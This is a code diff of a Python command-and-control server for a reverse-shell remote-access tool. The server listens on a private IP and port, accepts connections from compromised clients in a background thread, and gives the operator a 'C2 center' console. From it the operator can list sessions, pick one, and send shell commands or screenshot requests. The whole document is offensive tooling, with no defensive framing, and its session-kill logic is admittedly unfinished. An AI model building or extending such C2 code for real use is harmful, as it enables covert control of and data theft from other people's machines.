@@ -1,31 +1,35 @@
 #!/usr/bin/python
-import base64
+
 import socket
 import json
+import os
 import base64
+import threading
 
-def send_j(data):
-    json_data = json.dumps(data)
-    target.send(json_data.encode('utf-8'))
 
-def recv_j():
+def shell(target, ip):
+    def send_j(data):
+        json_data = json.dumps(data)
+        target.send(json_data.encode('utf-8'))
+
+    def recv_j():
         data = ""
         while True:
             try:
-                data = data + target.recv(1024).decode('utf-8') #receiving chunks of 1024 bytes until json.loads(data) returns a correct json format
-                return json.loads(data) #
-            except ValueError: #if the output of json.loads(data) is not complete (not in json format)
+                data = data + target.recv(1024).decode('utf-8')  # receiving chunks of 1024 bytes until json.loads(data) returns a correct json format
+                return json.loads(data)
+            except ValueError:  # if the output of json.loads(data) is not complete (not in json format)
                 continue
-def shell():
+
     #outside of while loop we can set up an input for sessions and client management
     #and only the client connected will enter the loop and when exit we come back to choosing clients
     while True:
         cmd =  input("# ")
         send_j(cmd) # send command to client
-        if cmd == "exit_server":
+        if cmd == "background":
             break
-        elif cmd == "exit_client":
-            continue
+        elif cmd == "kill_client":
+            break
         elif cmd[:2] == "cd" and len(cmd) > 2: #only if cd and a path (if cd only it runs as normal command)
             continue
         elif cmd[:10] == "screenshot":
@@ -55,18 +59,67 @@ def shell():
         print(output)
 
 def server():
-    global s
-    global ip
-    global target
-    #creating socket object
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # AF_INET for IPv4 connexion and SOCK_STREAM for TCP connection
-    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-    #binding socket to local IP and port
-    s.bind(("192.168.92.128", 7777)) #listening on port 7777
-    s.listen(5) #max connections allowed on server
-    print("Listening to incoming connections")
-    target, ip = s.accept()
-    print(f"connection established from:{ip}")
+    global client_index
+    while True:
+        if stop_threads:
+            break
+        s.settimeout(1) #
+        try:
+            target, ip = s.accept() #accepting an incoming connection (target is socket object and IP is remote IP+port)
+            targets.append(target)
+            ips.append(ip)
+            print(str(targets[client_index]) + "---" + str(ips[client_index]) + "CONNECTED")
+            client_index += 1
+            continue
+        except:
+            pass
 
-server()
-shell()
+
+
+ #count of connections
+global s
+ips = [] #list of IP,port
+targets = [] #lisk of socket objects
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+s.bind(("192.168.92.128", 7777))
+s.listen(5)
+print("Listening to incoming connections")
+client_index = 0
+
+stop_threads = False
+thread1 = threading.Thread(target=server) #setting a thread to run function server()
+thread1.start()
+
+# C2 center
+while True:
+    cmd = input("C2 center >  ")
+    #exit C2 center
+    if cmd[:4] == "exit":
+        stop_threads = True #stop thread1
+        break # exit current while loop
+    elif cmd == "sessions":
+        count = 0
+        for ip in ips:
+            print(f"Session {count} ----- {ip}")
+            count += 1
+    #kill session <id>
+    elif cmd[:4] == "kill":
+        try:
+            session_id = int(cmd[5:])
+            targets.pop(session_id) #only remove session from list (connection still alive)
+            ips.pop(session_id)
+            #need to implement how to terminate session
+        except:
+            print ("No session to close")
+    #interact with a specific target
+    elif cmd[:7] == "session":
+        try:
+            session_id = int(cmd[8:])
+            target = targets[session_id]
+            ip = ips[session_id]
+
+        except:
+            print("Session not found")
+        else:
+            shell(target, ip)
